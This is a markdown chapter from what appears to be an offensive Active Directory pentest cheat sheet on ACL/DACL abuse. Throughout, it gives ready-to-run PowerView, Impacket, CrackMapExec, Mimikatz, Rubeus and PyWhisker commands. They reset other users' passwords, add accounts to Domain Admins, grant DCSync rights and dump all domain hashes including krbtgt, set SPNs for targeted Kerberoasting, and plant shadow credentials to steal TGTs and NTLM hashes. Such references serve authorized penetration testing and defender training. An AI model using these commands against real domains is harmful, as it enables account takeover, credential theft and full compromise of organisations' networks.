# 06 — ACL / DACL Abuse

[← Back to index](README.md)

## 6.1 Dangerous ACL Rights Reference

| ACL Right | Object Type | Attack | Impact |
|-----------|-------------|--------|--------|
| GenericAll | User | Change password, add to group, write properties | Full account takeover |
| GenericAll | Group | Add any member to group | Privilege escalation via group |
| GenericAll | Computer | RBCD attack, shadow credentials | Domain escalation |
| GenericWrite | User | Write SPN (Targeted Kerberoasting), write properties | Credential theft |
| GenericWrite | Group | Add members | Group membership abuse |
| GenericWrite | Computer | RBCD attack | Domain escalation |
| WriteOwner | Any | Change owner → grant GenericAll to self | Escalate to full control |
| WriteDACL | Any | Modify DACL → grant GenericAll to self | Escalate to full control |
| ForceChangePassword | User | Reset password without knowing current | Account takeover |
| AddMember | Group | Add self/others to group | Privilege escalation |
| ExtendedRight / AllExtendedRights | Domain | DCSync (replication rights) | Domain compromise |
| ExtendedRight DSReplication-* | Domain | DCSync directly | Dump all hashes |
| Self | Group | Add self as member | Privilege escalation |
| WriteProperty | User | Modify specific attributes | Targeted attribute abuse |
| Owns | Any | Object owner can grant any right | Escalate via ownership |

## 6.2 ACL Enumeration

```text
# BloodHound — best ACL visualization
# Click 'Outbound Object Control' on any node
# Use 'Shortest Paths to Domain Admins from Owned Principals'
```

```powershell
# PowerView — find interesting ACLs for current user
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.IdentityReferenceName -match 'current_user'
} | Select-Object ObjectDN, ActiveDirectoryRights, IdentityReferenceName

# Find all ACLs for specific user
Find-InterestingDomainAcl -ResolveGUIDs |
    Where-Object {$_.IdentityReferenceName -eq '$USER'} |
    Select-Object ObjectDN, ActiveDirectoryRights, AceType

# Get ACLs on specific object
Get-ObjectAcl -SamAccountName 'target_user' -ResolveGUIDs |
    Select-Object SecurityIdentifier, ActiveDirectoryRights, AceType

# Get ACL on Domain object (check for DCSync rights)
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=local' -ResolveGUIDs |
    Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|WriteDACL|WriteOwner|ExtendedRight'}

# Convert SID to name
Convert-SidToName S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-XXXX

# Check who owns an object
Get-ObjectAcl -SamAccountName 'target_user' | Select-Object ObjectSID, OwnerSID
```

```bash
# Impacket DACL tool
impacket-dacledit $DOMAIN/$USER:$PASS -dc-ip $DC_IP \
    -action read -target 'Domain Admins'
```

## 6.3 ACL Exploitation Techniques

### GenericAll / GenericWrite on User — Reset Password

```powershell
# Change target user's password (PowerView)
$SecPass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity target_user -AccountPassword $SecPass -Verbose
```

```bash
# From Linux — Impacket
impacket-changepasswd $DOMAIN/target_user@$DC_IP -newpass 'NewPass123!' \
    -authuser $USER -authpassword $PASS
```

```powershell
# Net command (if you have local access)
net user target_user NewPass123! /domain
```

### GenericAll / AddMember on Group — Add to Domain Admins

```powershell
# Add user to Domain Admins (PowerView)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'current_user' -Verbose

# Verify
Get-DomainGroupMember -Identity 'Domain Admins' | Select-Object MemberName
```

```bash
# From Linux — Impacket
impacket-net $DOMAIN/$USER:$PASS -dc-ip $DC_IP group member -group 'Domain Admins' -member current_user

# CME
crackmapexec ldap $DC_IP -u $USER -p $PASS -M groupadd \
    -o TARGET_GROUP='Domain Admins' -o TARGET_USER=current_user
```

### WriteDACL — Grant Self DCSync Rights

```powershell
# Add DCSync rights to yourself (PowerView)
$SecPassword = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('corp\hacker', $SecPassword)

# Import-Module .\PowerView.ps1
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity hacker -Rights DCSync

# Or try
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' \
    -PrincipalIdentity current_user \
    -Rights DCSync -Verbose
```

```bash
# Now DCSync
impacket-secretsdump $DOMAIN/current_user:$PASS@$DC_IP -just-dc
```

```powershell
.\Mimikatz.exe 'lsadump::dcsync /domain:corp.local /user:krbtgt' exit

# Grant GenericAll on domain
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' \
    -PrincipalIdentity current_user \
    -Rights All -Verbose
```

### Targeted Kerberoasting via GenericWrite — Set SPN

```powershell
# Set fake SPN on target user (makes them Kerberoastable)
Set-DomainObject -Identity target_user \
    -Set @{serviceprincipalname='fake/SPN'} -Verbose
```

```bash
# Kerberoast the target
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -usersfile users_with_spn.txt
```

```powershell
.\Rubeus.exe kerberoast /user:target_user /outfile:targeted.txt

# Clean up (remove SPN after cracking)
Set-DomainObject -Identity target_user \
    -Clear serviceprincipalname -Verbose
```

### Shadow Credentials (WriteOwner / GenericWrite on Computer or User)

```text
# Shadow Credentials: Add KeyCredential to target → get TGT without knowing password
# Requires: GenericWrite or WriteProperty (msDS-KeyCredentialLink) on target
```

```bash
# Install PyWhisker (Linux)
pip3 install pywhisker --break-system-packages

# Add shadow credential
python3 pywhisker.py -d $DOMAIN -u $USER -p $PASS \
    --target target_user --action add --dc-ip $DC_IP
# Saves .pfx file

# Get TGT using shadow credential
python3 gettgtpkinit.py -cert-pfx certificate.pfx -pfx-pass 'password' \
    $DOMAIN/target_user target_user.ccache
export KRB5CCNAME=target_user.ccache

# Then get NTLM hash via UnPAC the hash
python3 getnthash.py -key SESSION_KEY $DOMAIN/target_user
```

```powershell
# Whisker on Windows
.\Whisker.exe add /target:target_user
.\Rubeus.exe asktgt /user:target_user /certificate:BASE64 /password:PASS /ptt
```

---

[← Prev: 05 — Kerberos Delegation Attacks](05-kerberos-delegation-attacks.md) | [Next: 07 — Lateral Movement Techniques →](07-lateral-movement.md)
